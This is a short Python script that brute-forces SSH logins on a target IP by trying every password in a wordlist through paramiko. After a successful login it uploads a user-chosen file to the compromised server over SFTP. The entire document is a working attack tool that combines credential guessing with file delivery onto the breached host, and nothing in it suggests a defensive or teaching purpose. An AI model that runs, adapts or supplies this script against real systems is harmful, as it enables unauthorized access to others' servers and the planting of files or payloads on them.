import paramiko

def ssh_brute_force(ip, username, wordlist_file, path):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    with open(wordlist_file, 'r') as f:
        for line in f:
            password = line.strip()
            
            try:
                client.connect(ip, username=username, password=password)
                print(f"[*] Login successful! Username: {username} Password: {password}")
                
                # Do something with the SSH connection
                sftp = client.open_sftp()
                sftp.put(localpath=path, remotepath=path)
                sftp.close()
                client.close()
                break
            except paramiko.AuthenticationException:
                print(f"[-] Login failed. Username: {username} Password: {password} --Trying new password.")
            except Exception as e:
                print(f"[-] Exception occurred. Username: {username} Password: {password}")
                print(e)

if __name__ == '__main__':
    ip = input("Enter the IP address of the target SSH server: \n")
    username = input("Enter the username for the SSH server: \n")
    wordlist_file = input("Enter the path to the password file: \n")
    path = input("Enter the path to the file you want to transfer to server: \n")
    
    ssh_brute_force(ip, username, wordlist_file, path)
